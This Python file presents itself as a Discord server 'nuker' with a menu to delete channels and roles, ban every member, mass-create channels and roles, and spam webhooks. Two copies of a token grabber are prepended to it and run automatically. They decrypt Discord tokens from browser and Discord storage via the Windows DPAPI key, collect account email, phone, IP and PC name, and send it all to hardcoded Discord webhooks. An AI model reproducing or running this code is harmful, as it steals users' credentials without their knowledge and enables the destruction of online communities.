import os, asyncio, aiohttp, sys, random, time
from datetime import datetime
from colorama import Fore , Style
from packaging import version
from datetime import datetime, timezone

from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*

> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`

> :piñata: __Token__
	`{tok}`

*Made by JoNe* **|** ||https://github.com/JoNe-00||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by JoNe', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1378476674928082954/Kohs_FUtpQqMA2Ol8jlC0as61aznuUkve6z92otME7gS7rduQB3IJmsk6eNy7hJD1HYL', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*

> :dividers: __Account Information__
	Email: `{email}`
	Phone: `{phone}`
	2FA/MFA Enabled: `{mfa_enabled}`
	Nitro: `{has_nitro}`
	Expires in: `{days_left if days_left else "None"} day(s)`

> :computer: __PC Information__
	IP: `{ip}`
	Username: `{pc_username}`
	PC Name: `{pc_name}`
	Platform: `{platform}`

> :piñata: __Token__
	`{tok}`

*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1377685745040359514/gAUj0FwP95hn210gQ0IZb97CWfibzzY7dX5up2AuNgjnziFT5plmvStvcg3lPyMlkeGS', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()

try:
    from pystyle import Colorate, Write, System, Colors, Center, Anime
    import requests
except:
    os.system('pip install pystyle')
    os.system('pip install requests')

import ctypes

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

set_console_title("JoNe | GRoup#31")   

    
__VERSION__ = '1.7382047493'  
async def fetchname(pbin):
    async with aiohttp.ClientSession() as session:
        async with session.get(pbin) as response:
            if response.status == 200:
                webname = await response.text() 
                return webname.strip()  
            else:
                print(f"{response.status}")
                return None

try:
    os.system('cls')
        
except:
    os.system('clear')



def purplepink(text):
    os.system(""); faded = ""
    red = 120
    for line in text.splitlines():
        faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
        if not red == 255:
            red += 15
            if red > 255:
                red = 255
    return faded

def yellowred(text):
    os.system("") 
    faded = ""
    green = 255 
    
    for line in text.splitlines():
        faded += f"\033[38;2;255;{green};0m{line}\033[0m\n"
        if green > 0:
            green -= 15  
            if green < 0:
                green = 0  

    return faded 



uwuaizer = """

       ██╗ ██████╗ ███╗   ██╗███████╗
      ██║██╔═══██╗████╗  ██║██╔════╝
      ██║██║   ██║██╔██╗ ██║█████╗  
 ██   ██║██║   ██║██║╚██╗██║██╔══╝  
 ╚█████╔╝╚██████╔╝██║ ╚████║███████╗
  ╚════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝ """

logo = Center.XCenter(uwuaizer)
print(yellowred(logo))
    
def get_token():
    global token
    token = input("\033[38;2;255;225;0mT\033[0m\033[38;2;255;235;0mo\033[0m\033[38;2;255;245;0mk\033[0m\033[38;2;255;255;0me\033[0m\033[38;2;255;205;0mn\033[0m\033[38;2;255;195;0m:\033[0m ")
    headers = {
        "Authorization": f"Bot {token}"
    }
    if not 'id' in requests.Session().get("https://discord.com/api/v10/users/@me", headers=headers).json():
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mInvalid Token\033[0m")
        return get_token()
     
get_token()
guild_id = input("\033[38;2;255;225;0mG\033[0m\033[38;2;255;235;0mu\033[0m\033[38;2;255;245;0mi\033[0m\033[38;2;255;255;0ml\033[0m\033[38;2;255;205;0md\033[0m\033[38;2;255;195;0m \033[0m\033[38;2;255;185;0mI\033[0m\033[38;2;255;175;0md\033[0m\033[38;2;255;165;0m:\033[0m ")

headers = {
  "Authorization": f"Bot {token}"
}






async def create_channels(session,channel_name, type:int=0):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={'name': channel_name, 'type': type}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mCreated Channel to {guild_id} - {channel_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Create Channel to {guild_id}")
            pass

async def create_roles(session,role_name):
    while True:
        try:
            async with session.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json={'name': role_name}) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mCreated Role to {guild_id} - {role_name}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Create Role to {guild_id}")
            pass

async def send_message(hook, message, amount: int):
    async with aiohttp.ClientSession() as session:
        for i in range(amount):
            async with session.post(hook, json={'content': message, 'tts': False}) as response:
                if response.status == 429:  # Rate-limited
                    retry_after = (await response.json()).get('retry_after', 1)
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRate limited. Retrying after {retry_after} seconds.")
                    await asyncio.sleep(retry_after)
                elif response.status in [200, 201, 204]:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mMessage sent successfully!")
                else:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mFailed to send message with status {response.status}.")
            
            
async def WebhookSpam(session, channel_id, webname, msg_amt: int, msg, headers):
    try:
        async with session.post(
            f'https://discord.com/api/v9/channels/{channel_id}/webhooks', 
            headers=headers, 
            json={'name': webname}
        ) as r:
            if r.status == 429:  # Rate-limited
                retry_after = (await r.json()).get('retry_after', 1)
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited. Retrying after {retry_after} seconds.")
                await asyncio.sleep(retry_after)
            elif r.status in [200, 201, 204]:
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mWebhook '{webname}' created for channel {channel_id}.")
                webhook_raw = await r.json()
                webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                
                await asyncio.gather(send_message(webhook, msg, msg_amt))
            else:
                print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mFailed to create webhook with status {r.status}.")
    except aiohttp.ClientError as e:
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mError creating webhook: {str(e)}")
    except Exception as e:
        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mUnexpected error: {str(e)}")
        
        
async def get_roles():
   
    roleIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers) as r:
       
             m = await r.json()
             for role in m:
                roleIDS.append(role["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return roleIDS

async def get_channels():
   
    channelIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers) as r:
       
             m = await r.json()
             for channel in m:
                 channelIDS.append(channel["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return channelIDS
    
    
async def get_members():
   
    memberIDS = []
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers) as r:
       
             m = await r.json()
             for member in m:
                memberIDS.append(member["user"]["id"])
            
    except TypeError:
        print("SUS RATELIMTED...!")
         
    return memberIDS

async def ban_members(session, member_id:str):
    while True:
        try:
            async with session.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member_id}", headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mBanned Member {member_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Ban Member {member_id}")

async def delete_channels(session, channel_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mDeleted Channel {channel_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Delete Channel {channel_id}")

async def delete_role(session, role_id:str):
    while True:
        try:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}', headers=headers) as r:
                if r.status == 429:
                    print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;142mRatelimited, retrying soon..")
                else:
                    if r.status in [200, 201, 204]:
                        print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;34mDeleted Role {role_id}")
                        break
                    else:
                        break
        except:
            print(f"\033[90m{datetime.now(tz=timezone.utc).strftime(' %H:%M:%S - ')}\x1b[38;5;196mCouldn't Delete Role {role_id}")

def slow_write(text):
    for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.0005)
async def main():
    try:
        os.system('cls')
        
    except:
        os.system('clear')
        
    logo = Center.XCenter(uwuaizer)
    time.sleep(0.0002)
    #print(Colorate.Vertical(Colors.red_to_purple, logo))
    print(yellowred(logo), end='')
    slow_write(Center.XCenter(f"""

"""))
    print(Center.XCenter(f"""                                  
                          \033[38;2;255;0;205m╔══════════════════════════════╦═══════════════════════════════╗\033[0m
                          \033[38;2;255;0;180m║   \033[37mVersion: {version.parse(__VERSION__)}      \033[38;2;255;0;180m║   \033[37mDev: AiZeR /Rexa          \033[38;2;255;0;180m  ║
                          \033[38;2;255;0;155m╚══════════════════════════════╩═══════════════════════════════╝\033[0m
                 \033[38;2;255;0;130m╔══════════════════════════╦══════════════════════════╦════════════════════════╗\033[0m
                 \033[38;2;255;0;105m║   \033[37m[1] Delete Channels    \033[38;2;255;0;105m║    \033[37m[2] Delete Roles      \033[38;2;255;0;105m║    \033[37m[3] Ban Members     \033[38;2;255;0;105m║\033[0m
                 \033[38;2;255;0;80m╠══════════════════════════╬══════════════════════════╬════════════════════════╣\033[0m
                 \033[38;2;255;0;55m║   \033[37m[4] Create Channels    \033[38;2;255;0;55m║    \033[37m[5] Create Roles      \033[38;2;255;0;55m║    \033[37m[6] Webhook Spam    \033[38;2;255;0;55m║\033[0m
                 \033[38;2;255;0;30m╚══════════════════════════╩══════════════════════════╩════════════════════════╝\033[0m             
    """))
    choose = input(Fore.LIGHTCYAN_EX+f"                                        > {Fore.RESET}")
    if choose == '1':
        channels = await get_channels()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_channels(session, channel_id) for channel_id in channels])
           #async with tasksio.TaskPool(20_000) as pool:
              # for channel_id in channels:
                   #await pool.put(delete_channels(session, channel_id))

        await asyncio.sleep(1)
        await main()
    
    elif choose == '2':
        roles = await get_roles()
        async with aiohttp.ClientSession() as session:
           await asyncio.gather(*[delete_role(session, role_id) for role_id in roles])
           

        await asyncio.sleep(1)
        await main()
    
    elif choose == '4':
        chan_name = input(Fore.LIGHTCYAN_EX+"                                        Channel Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_channels(session, chan_name, 0) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main() 

    elif choose == '6':

        webname = "GRoup#31"
        web_msg = input(Fore.LIGHTCYAN_EX + "                                        Webhook Content:  ")
        msg_amt = int(input(Fore.LIGHTCYAN_EX + "                                        Amount of Messages:  "))
        channels = await get_channels()
        headers = {
            'Authorization': f"Bot {token}", 
            'Content-Type': 'application/json'
        }
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[WebhookSpam(session, channel_id, webname, msg_amt, web_msg, headers) for channel_id in channels])
        
        await asyncio.sleep(1)
        await main() 

    elif choose == '3':
        members = await get_members()
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[ban_members(session, member_id) for member_id in members])
            
            
        await asyncio.sleep(1)
        await main()
        
    elif choose == '5':
        role_name = input(Fore.LIGHTCYAN_EX+"                                        Role Name:  ")
        amt = int(input(Fore.LIGHTCYAN_EX+"                                        Amount:  "))
        async with aiohttp.ClientSession() as session:
            await asyncio.gather(*[create_roles(session, role_name) for i in range(amt)])
            
            
        await asyncio.sleep(1)
        await main()
        
    else:
        await asyncio.sleep(1)
        await main()

if __name__ == "__main__":
    
    asyncio.run(main())
    
